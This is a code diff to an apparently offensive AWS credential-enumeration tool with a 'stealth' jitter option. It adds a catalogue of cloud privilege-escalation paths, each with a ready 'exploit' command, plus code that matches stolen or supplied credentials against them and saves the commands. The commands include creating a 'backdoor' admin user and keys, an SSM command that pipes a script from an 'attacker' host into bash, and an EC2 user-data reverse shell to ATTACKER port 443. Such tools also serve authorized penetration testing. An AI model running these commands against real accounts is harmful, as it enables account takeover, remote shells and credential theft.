@@ -42,31 +42,468 @@ def jitter(stealth=False, min_s=0.5, max_s=2.5):
 DEFAULT_ROLE_NAME = "atmos-bootstrap-role"
 
 PRIV_CHECKS = [
+    # IAM
     "iam:GetUser", "iam:ListUsers", "iam:ListRoles", "iam:ListPolicies",
     "iam:ListAttachedUserPolicies", "iam:ListUserPolicies", "iam:GetUserPolicy",
+    "iam:ListAttachedRolePolicies", "iam:ListRolePolicies", "iam:GetRolePolicy",
     "iam:SimulatePrincipalPolicy", "iam:CreateUser", "iam:CreateAccessKey",
     "iam:AttachUserPolicy", "iam:PutUserPolicy", "iam:CreateLoginProfile",
-    "iam:PassRole", "iam:UpdateAssumeRolePolicy",
+    "iam:UpdateLoginProfile", "iam:AddUserToGroup",
+    "iam:AttachRolePolicy", "iam:PutRolePolicy", "iam:AttachGroupPolicy", "iam:PutGroupPolicy",
+    "iam:CreatePolicyVersion", "iam:SetDefaultPolicyVersion",
+    "iam:PassRole", "iam:UpdateAssumeRolePolicy", "iam:CreateRole",
+    # STS
     "sts:AssumeRole", "sts:GetFederationToken", "sts:GetSessionToken",
+    # S3
     "s3:ListAllMyBuckets", "s3:GetObject", "s3:PutObject",
     "s3:DeleteObject", "s3:GetBucketPolicy", "s3:PutBucketPolicy",
+    # EC2
     "ec2:DescribeInstances", "ec2:DescribeSecurityGroups",
     "ec2:DescribeVpcs", "ec2:RunInstances", "ec2:DescribeImages",
+    # EKS
     "eks:ListClusters", "eks:DescribeCluster", "eks:CreateCluster", "eks:DeleteCluster",
+    # ECR
     "ecr:DescribeRepositories", "ecr:GetAuthorizationToken", "ecr:BatchGetImage",
+    "ecr:PutImage",
+    # Lambda
     "lambda:ListFunctions", "lambda:InvokeFunction", "lambda:UpdateFunctionCode",
+    "lambda:CreateFunction", "lambda:AddPermission", "lambda:CreateEventSourceMapping",
+    "lambda:UpdateFunctionConfiguration",
+    # SSM
     "ssm:DescribeInstanceInformation", "ssm:SendCommand",
     "ssm:GetParameter", "ssm:GetParameters", "ssm:DescribeParameters",
-    "ssm:PutParameter", "ssm:DeleteParameter",
+    "ssm:PutParameter", "ssm:DeleteParameter", "ssm:StartSession",
+    # Secrets Manager
     "secretsmanager:ListSecrets", "secretsmanager:GetSecretValue",
     "secretsmanager:PutSecretValue", "secretsmanager:CreateSecret",
+    # RDS
     "rds:DescribeDBInstances", "rds:DescribeDBClusters",
+    # DynamoDB
     "dynamodb:ListTables", "dynamodb:Scan", "dynamodb:GetItem",
+    # CloudFormation
     "cloudformation:ListStacks", "cloudformation:GetTemplate",
+    "cloudformation:CreateStack", "cloudformation:UpdateStack",
+    # Organizations
     "organizations:DescribeOrganization", "organizations:ListAccounts",
+    # Logs
     "logs:DescribeLogGroups", "logs:FilterLogEvents",
+    # CodeBuild
+    "codebuild:CreateProject", "codebuild:StartBuild",
+    # Glue
+    "glue:CreateDevEndpoint", "glue:UpdateDevEndpoint",
+    # SageMaker
+    "sagemaker:CreateNotebookInstance", "sagemaker:CreateProcessingJob",
+    # DataPipeline
+    "datapipeline:CreatePipeline", "datapipeline:PutPipelineDefinition",
+    # ECS
+    "ecs:RegisterTaskDefinition", "ecs:RunTask", "ecs:CreateService",
+    # CodeStar
+    "codestar:CreateProject",
+    # STS
     "sts:GetCallerIdentity",
 ]
+
+
+# ── Privilege Escalation Paths ────────────────────────────────────────────────
+
+PRIVESC_PATHS = [
+    # ── Direct IAM Manipulation ───────────────────────────────────────────
+    {
+        "id": "iam-create-access-key",
+        "name": "Create access key for another user",
+        "risk": "CRITICAL",
+        "requires": ["iam:CreateAccessKey"],
+        "requires_any": [],
+        "description": "Create new access keys for any IAM user, including admins.",
+        "exploit": "aws iam create-access-key --user-name <admin-user>",
+    },
+    {
+        "id": "iam-create-login-profile",
+        "name": "Create/update console password for another user",
+        "risk": "CRITICAL",
+        "requires": [],
+        "requires_any": ["iam:CreateLoginProfile", "iam:UpdateLoginProfile"],
+        "description": "Set a console password for any IAM user to log in as them.",
+        "exploit": "aws iam create-login-profile --user-name <admin-user> --password <pass>",
+    },
+    {
+        "id": "iam-attach-admin-policy",
+        "name": "Attach admin policy to self/user",
+        "risk": "CRITICAL",
+        "requires": ["iam:AttachUserPolicy"],
+        "requires_any": [],
+        "description": "Attach AdministratorAccess or any managed policy to a user.",
+        "exploit": "aws iam attach-user-policy --user-name <self> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+    },
+    {
+        "id": "iam-put-user-policy",
+        "name": "Add inline admin policy to user",
+        "risk": "CRITICAL",
+        "requires": ["iam:PutUserPolicy"],
+        "requires_any": [],
+        "description": "Write an inline policy granting full admin to any user.",
+        "exploit": 'aws iam put-user-policy --user-name <self> --policy-name escalate --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\'',
+    },
+    {
+        "id": "iam-attach-role-policy",
+        "name": "Attach admin policy to role",
+        "risk": "CRITICAL",
+        "requires": ["iam:AttachRolePolicy"],
+        "requires_any": [],
+        "description": "Attach AdministratorAccess to any role, then assume it.",
+        "exploit": "aws iam attach-role-policy --role-name <role> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+    },
+    {
+        "id": "iam-put-role-policy",
+        "name": "Add inline admin policy to role",
+        "risk": "CRITICAL",
+        "requires": ["iam:PutRolePolicy"],
+        "requires_any": [],
+        "description": "Write an inline policy granting full admin to any role.",
+        "exploit": "aws iam put-role-policy --role-name <role> --policy-name escalate --policy-document '{...}'",
+    },
+    {
+        "id": "iam-attach-group-policy",
+        "name": "Attach admin policy to group",
+        "risk": "CRITICAL",
+        "requires": ["iam:AttachGroupPolicy"],
+        "requires_any": [],
+        "description": "Attach AdministratorAccess to a group you belong to.",
+        "exploit": "aws iam attach-group-policy --group-name <group> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
+    },
+    {
+        "id": "iam-put-group-policy",
+        "name": "Add inline admin policy to group",
+        "risk": "CRITICAL",
+        "requires": ["iam:PutGroupPolicy"],
+        "requires_any": [],
+        "description": "Write an inline policy granting full admin to a group you belong to.",
+        "exploit": "aws iam put-group-policy --group-name <group> --policy-name escalate --policy-document '{...}'",
+    },
+    {
+        "id": "iam-create-policy-version",
+        "name": "Create new policy version with admin access",
+        "risk": "CRITICAL",
+        "requires": ["iam:CreatePolicyVersion"],
+        "requires_any": [],
+        "description": "Create a new version of an existing managed policy with full admin permissions and set it as default.",
+        "exploit": "aws iam create-policy-version --policy-arn <policy-arn> --policy-document '{...}' --set-as-default",
+    },
+    {
+        "id": "iam-set-default-policy-version",
+        "name": "Activate a permissive older policy version",
+        "risk": "HIGH",
+        "requires": ["iam:SetDefaultPolicyVersion"],
+        "requires_any": [],
+        "description": "Switch the active version of a managed policy to an older, more permissive version.",
+        "exploit": "aws iam set-default-policy-version --policy-arn <arn> --version-id v1",
+    },
+    {
+        "id": "iam-add-user-to-group",
+        "name": "Add self to admin group",
+        "risk": "CRITICAL",
+        "requires": ["iam:AddUserToGroup"],
+        "requires_any": [],
+        "description": "Add your user to a group with admin or elevated policies.",
+        "exploit": "aws iam add-user-to-group --group-name admins --user-name <self>",
+    },
+    {
+        "id": "iam-update-assume-role-policy",
+        "name": "Modify role trust policy to allow self-assumption",
+        "risk": "CRITICAL",
+        "requires": ["iam:UpdateAssumeRolePolicy"],
+        "requires_any": [],
+        "description": "Update a role's trust policy to allow your user/role to assume it.",
+        "exploit": "aws iam update-assume-role-policy --role-name <admin-role> --policy-document '{...self as principal...}'",
+    },
+    {
+        "id": "iam-create-user-full",
+        "name": "Create new IAM user with admin access",
+        "risk": "CRITICAL",
+        "requires": ["iam:CreateUser", "iam:CreateAccessKey"],
+        "requires_any": ["iam:AttachUserPolicy", "iam:PutUserPolicy", "iam:AddUserToGroup"],
+        "description": "Create a new IAM user, attach admin policy, and generate access keys.",
+        "exploit": "aws iam create-user --user-name backdoor && aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && aws iam create-access-key --user-name backdoor",
+    },
+
+    # ── PassRole + Service Exploitation ───────────────────────────────────
+    {
+        "id": "passrole-lambda",
+        "name": "PassRole + Lambda code execution",
+        "risk": "CRITICAL",
+        "requires": ["iam:PassRole"],
+        "requires_any": ["lambda:CreateFunction", "lambda:UpdateFunctionCode"],
+        "description": "Pass a privileged role to a Lambda function and execute code as that role. "
+                       "Can also update existing function code to hijack its role.",
+        "exploit": "aws lambda create-function --function-name pwn --role <admin-role-arn> --runtime python3.12 --handler lambda_function.handler --zip-file fileb://payload.zip",
+    },
+    {
+        "id": "passrole-ec2",
+        "name": "PassRole + EC2 instance with privileged profile",
+        "risk": "CRITICAL",
+        "requires": ["iam:PassRole", "ec2:RunInstances"],
+        "requires_any": [],
+        "description": "Launch an EC2 instance with a privileged instance profile. "
+                       "Access the instance metadata service to get temporary credentials.",
+        "exploit": "aws ec2 run-instances --image-id <ami> --instance-type t3.micro --iam-instance-profile Name=<admin-profile> --user-data '#!/bin/bash\\ncurl http://169.254.169.254/latest/meta-data/iam/...'",
+    },
+    {
+        "id": "passrole-cloudformation",
+        "name": "PassRole + CloudFormation stack",
+        "risk": "CRITICAL",
+        "requires": ["iam:PassRole", "cloudformation:CreateStack"],
+        "requires_any": [],
+        "description": "Create a CloudFormation stack with a privileged service role. "
+                       "The stack executes with the role's permissions.",
+        "exploit": "aws cloudformation create-stack --stack-name pwn --template-body file://template.yml --role-arn <admin-role-arn>",
+    },
+    {
+        "id": "passrole-glue",
+        "name": "PassRole + Glue dev endpoint",
+        "risk": "HIGH",
+        "requires": ["iam:PassRole", "glue:CreateDevEndpoint"],
+        "requires_any": [],
+        "description": "Create a Glue dev endpoint with a privileged role and SSH into it.",
+        "exploit": "aws glue create-dev-endpoint --endpoint-name pwn --role-arn <admin-role-arn> --public-key file://key.pub",
+    },
+    {
+        "id": "passrole-codebuild",
+        "name": "PassRole + CodeBuild project",
+        "risk": "HIGH",
+        "requires": ["iam:PassRole", "codebuild:CreateProject"],
+        "requires_any": [],
+        "description": "Create a CodeBuild project with a privileged service role. "
+                       "Buildspec commands run as that role.",
+        "exploit": "aws codebuild create-project --name pwn --service-role <admin-role-arn> --source type=NO_SOURCE --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL",
+    },
+    {
+        "id": "passrole-sagemaker",
+        "name": "PassRole + SageMaker notebook",
+        "risk": "HIGH",
+        "requires": ["iam:PassRole", "sagemaker:CreateNotebookInstance"],
+        "requires_any": [],
+        "description": "Create a SageMaker notebook instance with a privileged role for code execution.",
+        "exploit": "aws sagemaker create-notebook-instance --notebook-instance-name pwn --role-arn <admin-role-arn> --instance-type ml.t3.medium",
+    },
+    {
+        "id": "passrole-datapipeline",
+        "name": "PassRole + Data Pipeline",
+        "risk": "HIGH",
+        "requires": ["iam:PassRole", "datapipeline:CreatePipeline"],
+        "requires_any": [],
+        "description": "Create a Data Pipeline with a privileged role for arbitrary command execution.",
+        "exploit": "aws datapipeline create-pipeline --name pwn --unique-id pwn",
+    },
+    {
+        "id": "passrole-ecs",
+        "name": "PassRole + ECS task execution",
+        "risk": "CRITICAL",
+        "requires": ["iam:PassRole", "ecs:RegisterTaskDefinition"],
+        "requires_any": ["ecs:RunTask", "ecs:CreateService"],
+        "description": "Register an ECS task definition with a privileged role and run it.",
+        "exploit": "aws ecs register-task-definition --family pwn --task-role-arn <admin-role-arn> --container-definitions '[...]' && aws ecs run-task --task-definition pwn --cluster <cluster>",
+    },
+
+    # ── Direct Service Exploitation ───────────────────────────────────────
+    {
+        "id": "lambda-update-code",
+        "name": "Update existing Lambda function code",
+        "risk": "CRITICAL",
+        "requires": ["lambda:UpdateFunctionCode"],
+        "requires_any": [],
+        "description": "Overwrite an existing Lambda function's code to execute as its role. "
+                       "No PassRole needed — hijacks the function's existing role.",
+        "exploit": "aws lambda update-function-code --function-name <target-fn> --zip-file fileb://payload.zip",
+    },
+    {
+        "id": "lambda-update-config-layer",
+        "name": "Add malicious Lambda layer",
+        "risk": "HIGH",
+        "requires": ["lambda:UpdateFunctionConfiguration"],
+        "requires_any": [],
+        "description": "Add a Lambda layer containing malicious code to an existing function.",
+        "exploit": "aws lambda update-function-configuration --function-name <fn> --layers <malicious-layer-arn>",
+    },
+    {
+        "id": "lambda-event-source",
+        "name": "Create Lambda event source mapping",
+        "risk": "HIGH",
+        "requires": ["lambda:CreateEventSourceMapping"],
+        "requires_any": [],
+        "description": "Map an event source (SQS, DynamoDB, Kinesis) to a Lambda to trigger execution.",
+        "exploit": "aws lambda create-event-source-mapping --function-name <fn> --event-source-arn <source-arn>",
+    },
+    {
+        "id": "ssm-send-command",
+        "name": "SSM SendCommand RCE on managed instances",
+        "risk": "CRITICAL",
+        "requires": ["ssm:SendCommand"],
+        "requires_any": [],
+        "description": "Execute arbitrary commands on SSM-managed EC2 instances. "
+                       "Inherits the instance profile role.",
+        "exploit": "aws ssm send-command --instance-ids <id> --document-name AWS-RunShellScript --parameters commands='curl http://attacker/shell.sh|bash'",
+    },
+    {
+        "id": "ssm-start-session",
+        "name": "SSM StartSession interactive shell",
+        "risk": "CRITICAL",
+        "requires": ["ssm:StartSession"],
+        "requires_any": [],
+        "description": "Open an interactive shell session on SSM-managed instances.",
+        "exploit": "aws ssm start-session --target <instance-id>",
+    },
+    {
+        "id": "ec2-userdata",
+        "name": "Launch EC2 with reverse shell in user-data",
+        "risk": "HIGH",
+        "requires": ["ec2:RunInstances"],
+        "requires_any": [],
+        "description": "Launch an EC2 instance with a reverse shell in user-data. "
+                       "If the instance has an IAM profile, steal those credentials.",
+        "exploit": "aws ec2 run-instances --image-id <ami> --instance-type t3.micro --user-data '#!/bin/bash\\nbash -i >& /dev/tcp/ATTACKER/443 0>&1'",
+    },
+    {
+        "id": "codestar-backdoor",
+        "name": "CodeStar project creates admin role",
+        "risk": "HIGH",
+        "requires": ["codestar:CreateProject"],
+        "requires_any": [],
+        "description": "Creating a CodeStar project auto-creates IAM roles with elevated permissions.",
+        "exploit": "aws codestar create-project --name pwn --id pwn",
+    },
+    {
+        "id": "cloudformation-update",
+        "name": "Update CloudFormation stack with malicious template",
+        "risk": "HIGH",
+        "requires": ["cloudformation:UpdateStack"],
+        "requires_any": [],
+        "description": "Update an existing stack's template to create backdoor resources using the stack's service role.",
+        "exploit": "aws cloudformation update-stack --stack-name <stack> --template-body file://backdoor.yml",
+    },
+
+    # ── Credential/Secret Access ──────────────────────────────────────────
+    {
+        "id": "secrets-manager-read",
+        "name": "Read secrets from Secrets Manager",
+        "risk": "HIGH",
+        "requires": ["secretsmanager:GetSecretValue"],
+        "requires_any": [],
+        "description": "Read secret values which may contain database passwords, API keys, or other credentials for lateral movement.",
+        "exploit": "aws secretsmanager get-secret-value --secret-id <name>",
+    },
+    {
+        "id": "ssm-param-read",
+        "name": "Read SSM SecureString parameters",
+        "risk": "HIGH",
+        "requires": ["ssm:GetParameter"],
+        "requires_any": [],
+        "description": "Read SSM parameters including SecureStrings (encrypted values) which may contain credentials.",
+        "exploit": "aws ssm get-parameter --name <name> --with-decryption",
+    },
+    {
+        "id": "s3-bucket-policy",
+        "name": "Modify S3 bucket policy for exfil/persistence",
+        "risk": "HIGH",
+        "requires": ["s3:PutBucketPolicy"],
+        "requires_any": [],
+        "description": "Modify bucket policies to grant external access or exfiltrate data.",
+        "exploit": "aws s3api put-bucket-policy --bucket <bucket> --policy '{...allow external principal...}'",
+    },
+    {
+        "id": "ecr-push-image",
+        "name": "Push malicious container image to ECR",
+        "risk": "HIGH",
+        "requires": ["ecr:PutImage"],
+        "requires_any": [],
+        "description": "Push a backdoored container image to ECR for supply chain compromise. "
+                       "Containers using this repo will pull the malicious image.",
+        "exploit": "docker push <account>.dkr.ecr.<region>.amazonaws.com/<repo>:latest",
+    },
+
+    # ── Cross-Account / Org ───────────────────────────────────────────────
+    {
+        "id": "sts-assume-role",
+        "name": "Assume roles (cross-account pivot)",
+        "risk": "HIGH",
+        "requires": ["sts:AssumeRole"],
+        "requires_any": [],
+        "description": "Assume roles in same or other accounts. Check visible roles for assumable targets.",
+        "exploit": "aws sts assume-role --role-arn arn:aws:iam::<account>:role/<role> --role-session-name pwn",
+    },
+    {
+        "id": "sts-federation",
+        "name": "Get federation token for console access",
+        "risk": "MEDIUM",
+        "requires": ["sts:GetFederationToken"],
+        "requires_any": [],
+        "description": "Generate a federation token to access the AWS console via URL.",
+        "exploit": "aws sts get-federation-token --name console-user --policy '{...}'",
+    },
+    {
+        "id": "iam-create-role-assume",
+        "name": "Create new role with self-trust and admin policy",
+        "risk": "CRITICAL",
+        "requires": ["iam:CreateRole"],
+        "requires_any": ["iam:AttachRolePolicy", "iam:PutRolePolicy"],
+        "description": "Create a new role trusting your own principal, attach admin policy, then assume it.",
+        "exploit": "aws iam create-role --role-name backdoor --assume-role-policy-document '{...self trust...}' && aws iam attach-role-policy --role-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess && aws sts assume-role --role-arn <new-role-arn> --role-session-name pwn",
+    },
+]
+
+
+def check_privesc_paths(allowed_actions, identity, iam_data):
+    """
+    Evaluate known privilege escalation paths against the allowed actions.
+    Returns list of viable paths with risk level and exploitation details.
+    """
+    if not allowed_actions:
+        return []
+
+    allowed_set = set(allowed_actions)
+    viable = []
+
+    for path in PRIVESC_PATHS:
+        # Check all required actions are allowed
+        has_required = all(a in allowed_set for a in path["requires"])
+        if not has_required:
+            continue
+
+        # Check at least one of requires_any (if specified)
+        if path["requires_any"]:
+            has_any = any(a in allowed_set for a in path["requires_any"])
+            if not has_any:
+                continue
+
+        # Build the matched actions list
+        matched = list(path["requires"])
+        for a in path["requires_any"]:
+            if a in allowed_set:
+                matched.append(a)
+
+        entry = {
+            "id": path["id"],
+            "name": path["name"],
+            "risk": path["risk"],
+            "matched_actions": matched,
+            "description": path["description"],
+            "exploit": path["exploit"],
+        }
+
+        # Enrich with context from IAM data
+        if "iam:CreateAccessKey" in matched and iam_data.get("visible_users"):
+            entry["targets"] = iam_data["visible_users"][:10]
+        if "sts:AssumeRole" in matched and iam_data.get("visible_roles"):
+            entry["assumable_roles"] = iam_data["visible_roles"][:10]
+        if "iam:AddUserToGroup" in matched and iam_data.get("groups"):
+            entry["current_groups"] = iam_data["groups"]
+
+        viable.append(entry)
+
+    # Sort by risk: CRITICAL > HIGH > MEDIUM
+    risk_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}
+    viable.sort(key=lambda x: risk_order.get(x["risk"], 3))
+
+    return viable
 
 ALL_REGIONS = [
     "us-east-1", "us-east-2", "us-west-1", "us-west-2",
@@ -1040,6 +1477,54 @@ def enumerate_credential(key_id, secret, token, args, extra_accounts):
         print(f"[{ts()}] [3] Skipping priv simulation (--fast)", flush=True)
         result["privs"] = {}
 
+    # [3b] Privilege escalation path analysis
+    allowed_actions = result.get("privs", {}).get("allowed", [])
+    if allowed_actions:
+        print(f"[{ts()}] [3b] Privilege escalation path analysis...", flush=True)
+        privesc = check_privesc_paths(allowed_actions, identity, iam)
+        result["privesc_paths"] = privesc
+        if privesc:
+            critical = [p for p in privesc if p["risk"] == "CRITICAL"]
+            high = [p for p in privesc if p["risk"] == "HIGH"]
+            medium = [p for p in privesc if p["risk"] == "MEDIUM"]
+            print(f"[{ts()}]   ⚠ {len(privesc)} PRIVESC PATHS FOUND "
+                  f"({len(critical)} critical, {len(high)} high, {len(medium)} medium)", flush=True)
+            for p in privesc:
+                risk_color = "⚠" if p["risk"] == "CRITICAL" else "→"
+                print(f"[{ts()}]   {risk_color} [{p['risk']}] {p['name']}", flush=True)
+                print(f"[{ts()}]     Actions : {', '.join(p['matched_actions'])}", flush=True)
+                print(f"[{ts()}]     Exploit : {p['exploit'][:120]}", flush=True)
+                if p.get("targets"):
+                    print(f"[{ts()}]     Targets : {', '.join(p['targets'][:5])}{'...' if len(p.get('targets',[])) > 5 else ''}", flush=True)
+                if p.get("assumable_roles"):
+                    print(f"[{ts()}]     Roles   : {', '.join(p['assumable_roles'][:5])}{'...' if len(p.get('assumable_roles',[])) > 5 else ''}", flush=True)
+        else:
+            print(f"[{ts()}]   No known privesc paths with current permissions", flush=True)
+    else:
+        print(f"[{ts()}] [3b] Privesc analysis — skipped (no priv simulation data)", flush=True)
+        result["privesc_paths"] = []
+
+    # Save privesc paths to file if any found
+    if result.get("privesc_paths"):
+        privesc_file = os.path.join(out_dir, f"privesc_{account_id}.txt")
+        with open(privesc_file, "w") as f:
+            f.write(f"Privilege Escalation Paths — Account {account_id}\n")
+            f.write(f"Identity: {identity.get('arn', 'unknown')}\n")
+            f.write(f"Total paths: {len(result['privesc_paths'])}\n")
+            f.write("=" * 60 + "\n\n")
+            for p in result["privesc_paths"]:
+                f.write(f"[{p['risk']}] {p['name']}\n")
+                f.write(f"  ID      : {p['id']}\n")
+                f.write(f"  Actions : {', '.join(p['matched_actions'])}\n")
+                f.write(f"  Desc    : {p['description']}\n")
+                f.write(f"  Exploit : {p['exploit']}\n")
+                if p.get("targets"):
+                    f.write(f"  Targets : {', '.join(p['targets'])}\n")
+                if p.get("assumable_roles"):
+                    f.write(f"  Roles   : {', '.join(p['assumable_roles'])}\n")
+                f.write("\n")
+        print(f"[{ts()}]   Privesc paths saved → {privesc_file}", flush=True)
+
     # [4] S3
     jitter(getattr(args, "stealth", False))
     print(f"[{ts()}] [4] S3...", flush=True)
@@ -1341,6 +1826,15 @@ def print_summary(all_results):
             print(f"  │  Role assumed : ⚠ {assumed} account(s)")
         if hv:
             print(f"  │  High privs  : {', '.join(hv[:3])}{'...' if len(hv)>3 else ''}")
+        privesc = r.get("privesc_paths", [])
+        if privesc:
+            critical = [p for p in privesc if p["risk"] == "CRITICAL"]
+            high = [p for p in privesc if p["risk"] == "HIGH"]
+            print(f"  │  Privesc     : ⚠ {len(privesc)} paths ({len(critical)} critical, {len(high)} high)")
+            for p in privesc[:5]:
+                print(f"  │    [{p['risk']}] {p['name']}")
+            if len(privesc) > 5:
+                print(f"  │    ... and {len(privesc)-5} more")
         print(f"  └{'─'*50}")
 
     print(f"{'═'*60}\n")
